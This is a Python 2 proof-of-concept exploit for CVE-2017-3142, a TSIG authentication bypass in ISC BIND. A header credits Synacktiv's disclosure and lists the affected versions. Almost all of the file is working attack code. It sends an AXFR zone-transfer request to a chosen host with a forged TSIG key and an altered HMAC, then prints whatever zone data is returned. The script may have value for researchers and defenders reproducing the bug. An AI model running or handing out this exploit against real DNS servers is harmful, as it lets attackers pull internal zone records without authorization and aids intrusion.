'''
CVE-2017-3142 AXFR PoC exploit. Thanks Synacktiv [synacktiv.ninja] for vulnerability publication.
The issue was tested and proven to affect the following BIND version:
- BIND 9.9.10
- BIND 9.10.5
- BIND 9.11.1
According to ISC, the following versions are affected:
- 9.4.0 to 9.8.8
- 9.9.0 to 9.9.10 P1
- 9.10.0 to 9.10.5 P1
- 9.11.0 to 9.11.1 P1
- 9.9.3 S1 to 9.9.10 S2
- 9.10.5 S1 to 9.10.5 S2

Details: http://www.synacktiv.com/ressources/CVE-2017-3142_BIND9_TSIG_zone_transfers_vulnerability_Synacktiv.pdf
'''

import dns.query
import dns.zone
import dns.tsigkeyring
import dns.tsig
import dns.message
import dns.update
from time import time, sleep
from struct import pack

def exploit(host, zone, keyname):
    keyring = dns.tsigkeyring.from_text({
        keyname: 'dog'.encode('base64')
    })
    axfr = dns.message.make_query(zone, dns.rdatatype.AXFR)
    axfr.use_tsig(keyring, keyname=keyname, algorithm=dns.tsig.HMAC_SHA256)
    axfr.request_hmac = 'dog' # alter the hmac
    print '[+] sending axfr request'
    ans = dns.query.tcp(axfr, host)
    print ans.to_text()

if __name__ == '__main__':
    from argparse import ArgumentParser
    p = ArgumentParser()
    p.add_argument('host')
    p.add_argument('zone')
    p.add_argument('keyname')
    o = p.parse_args()

    exploit(o.host, o.zone, o.keyname)